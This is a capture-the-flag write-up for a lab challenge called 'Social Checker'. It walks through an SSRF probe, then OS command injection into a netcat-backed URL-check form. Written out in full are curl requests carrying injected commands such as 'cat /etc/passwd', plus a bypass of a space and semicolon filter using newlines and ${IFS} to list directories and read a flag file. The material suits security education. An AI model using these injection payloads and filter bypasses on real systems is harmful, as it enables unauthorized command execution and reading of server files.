# Social Checker
Social Checker - check if your favourite social media site is online!

http://46.101.107.117:2103

---

Social Checker page:

![](social-checker.png)

HTTP request is a simple POST:
```
POST http://46.101.107.117:2103/check.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

url=twitter.com
```

At first, I thought this is about SSRF. I tried:
```
$ curl -X POST -d 'url=https://webhook.site/#!/ffcc105b-44c4-4ad7-a3fe-8c6296c202e0' http://46.101.107.117:2103/check.php
nc: bad port spec 'https://webhook.site/#!/ffcc105b-44c4-4ad7-a3fe-8c6296c202e0'
```

Ah, this is backed by [Netcat](https://en.wikipedia.org/wiki/Netcat).

The next idea was _command injection_:
```
$ curl -X POST -d 'url=twitter.com && cat /etc/passwd' http://46.101.107.117:2103/check.php
nice try - www.youtube.com/watch?v=a4eav7dFvc8
```

After some errors and trials, I discovered that some characters are blocked. Mainly _space_ and `;`.

I googled a bit how to bypass those restrictions:
- https://portswigger.net/web-security/os-command-injection:
  Use **newline** for command separation.
- https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions:
  Use `${IFS}` instead of _space_.

I created a new file `payload`:
```
url=twitter.com
ls${IFS}/
```

Execute `ls${IFS}/` payload:
```
$ curl -X POST --data-binary @payload http://46.101.107.117:2103/check.php
ls: 80: No such file or directory
/:
bin
dev
etc
home
htdocs
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Execute `ls${IFS}/htdocs` payload:
```
...
/htdocs:
bg.jpg
check.php
flag.txt
index.php
```

Finally, read the flag using `cat${IFS}/htdocs/flag.txt`:
```
he2021{1ts_fun_t0_1nj3kt_k0mmand5}cat: can't open '80': No such file or directory
```

The flag is `he2021{1ts_fun_t0_1nj3kt_k0mmand5}`

Nice challenge!